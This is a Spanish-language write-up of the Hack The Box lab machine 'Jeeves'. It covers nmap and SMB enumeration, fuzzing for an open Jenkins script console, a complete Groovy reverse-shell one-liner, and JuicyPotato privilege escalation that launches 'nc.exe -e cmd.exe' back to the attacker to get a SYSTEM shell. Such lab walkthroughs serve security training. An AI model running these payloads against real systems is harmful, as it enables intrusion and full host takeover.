
#Machine Jeeves
##Media

##    Skillss
### Jenkins Exploitation (Groovy Script Console)
### RottenPotato (SeImpersonatePrivilege)
### PassTheHash (Psexec)
### Breaking KeePass
### Alternate Data Streams (ADS)

## Reconocimiento

### Se reliza nmap 

```
nmap -sS -n -Pn -p- -vvv --min-rate 5000 10.10.10.63 -oG allPorts
nmap -p80,135,445,50000 -sVC -Pn 10.10.10.63 -oN nmap
```

```
 │ File: nmap
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Thu Jun 27 23:11:11 2024 as: nmap -p80,135,445,50000 -sVC -Pn -oN nmap 10.10.10.63
   2   │ Nmap scan report for 10.10.10.63
   3   │ Host is up (0.18s latency).
   4   │
   5   │ PORT      STATE SERVICE      VERSION
   6   │ 80/tcp    open  http         Microsoft IIS httpd 10.0
   7   │ |_http-server-header: Microsoft-IIS/10.0
   8   │ |_http-title: Ask Jeeves
   9   │ | http-methods:
  10   │ |_  Potentially risky methods: TRACE
  11   │ 135/tcp   open  msrpc        Microsoft Windows RPC
  12   │ 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
  13   │ 50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
  14   │ |_http-server-header: Jetty(9.4.z-SNAPSHOT)
  15   │ |_http-title: Error 404 Not Found
  16   │ Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
  17   │
  18   │ Host script results:
  19   │ | smb2-time:
  20   │ |   date: 2024-06-28T08:11:23
  21   │ |_  start_date: 2024-06-28T07:49:29
  22   │ | smb-security-mode:
  23   │ |   account_used: guest
  24   │ |   authentication_level: user
  25   │ |   challenge_response: supported
  26   │ |_  message_signing: disabled (dangerous, but default)
  27   │ | smb2-security-mode:
  28   │ |   3:1:1:
  29   │ |_    Message signing enabled but not required
  30   │ |_clock-skew: mean: 5h00m00s, deviation: 0s, median: 5h00m00s
  31   │
  32   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  33   │ # Nmap done at Thu Jun 27 23:12:00 2024 -- 1 IP address (1 host up) scanned in 48.93 seconds
```

### Se realizan pruebas con el puerto SMB que se encuentra abierto sin ser exitoso

```
└─# smbmap -H 10.10.10.63

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

┌──(root㉿kali)-[/home/…/Documents/htb/jeeves/nmap]
└─# crackmapexec smb 10.10.10.63
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)

┌──(root㉿kali)-[/home/…/Documents/htb/jeeves/nmap]
└─# smbclient -L 10.10.10.63 -N
session setup failed: NT_STATUS_ACCESS_DENIED

```
### Entonces podemos hacer un ataque de directorios con `wfuzz` lo hice al puerto 80 y al puerto 50000 que son http, al puerto 80 no encontro nada, lo hice con la lista seclist pero no encontro nada asi que lo hice con la lista medium de dirbuster.

```
└─# wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.63:50000/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                            
=====================================================================

000041607:   302        0 L      0 W        0 Ch        "askjeeves"                                                                                                                        
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

```
### Despues de escaneo de directorios se encontro directorio de administracion de jeeves `http://10.10.10.63:50000/askjeeves/` este portal de administracion no tiene contraseña ingresar en administrar jenkins y despues en consola de script

### En este apartado se observa que podemos escribir un script en goorvy para lo cual en `https://www.revshells.com/` podemos hacer una rv en groovy y entrar a la maquina

### Reverse shell en groovi

```
String host="<IP>";int port=4444;String cmd="cmd";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### prendemos un netcat con que escuche el puerto que colocamos en el rv

```
└─# rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.63] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke

```
### Observamos que tiene el privilegio impersonate habilitado, podemos utilizar `petitpotato`

```
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  <----
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

### Vamos a descargar `juicy-potato` y transferilo a la maquina victima. los sitios  que podemos utilizar son:

(https://ohpe.it/juicy-potato/CLSID/)

(https://github.com/ohpe/juicy-potato)

### Descargue la herramienta y prendi el servidor en python e intente usar certutil pero el equipo no tiene la herramienta instalada, para lo cual recorde que tiene el servicio smb abierto podemos utilizar `impacket smb server`

`impacket-smbserver smbshare $(pwd) -smb2support`

```
└─# impacket-smbserver <directorio> $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

### y en la maquina vitima hacemos una peticion para ver el directorio 

```
dir \\10.10.14.2\directorio
 Volume in drive \\10.10.14.2\directorio has no label.
 Volume Serial Number is ABCD-EFAA

 Directory of \\10.10.14.2\directorio

06/28/2024  10:16 PM           347,648 JuicyPotato.exe
06/28/2024  10:34 PM            28,160 nc.exe
               2 File(s)        375,808 bytes
               0 Dir(s)  15,015,393,145,319,977,344 bytes free

```

### Subimos los ejecutables que necesitamos con ayuda de smb con `copy`

### y ejecutamos el juicypopato par que con cosola se envie en nc dirigido al atacante.

### para la probar los CLSID se puede hacer con el siguiente comando antes validar que SO se tiene con `system info`

```
C:\Users\Administrator\.jenkins\tmp>.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
Testing {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 1337
......
[+] authresult 0
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```
### Despues de probar el CLSID lanzamos nc con redirecion de cmd al equipo atante

`C:\Users\Administrator\.jenkins\tmp>.\JuicyPotato.exe -l 1337 -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\Administrator\.jenkins\tmp\nc.exe -e cmd.exe 10.10.14.2 4445"  -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}`

```
C:\Users\Administrator\.jenkins\tmp>.\JuicyPotato.exe -l 1337 -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\Administrator\.jenkins\tmp\nc.exe -e cmd.exe 10.10.14.2 4445"  -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
.\JuicyPotato.exe -l 1337 -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\Administrator\.jenkins\tmp\nc.exe -e cmd.exe 10.10.14.2 4445"  -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}
Testing {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 1337
......
[+] authresult 0
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

### Pwned

```
└─# rlwrap -cAr nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.63] 49707
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

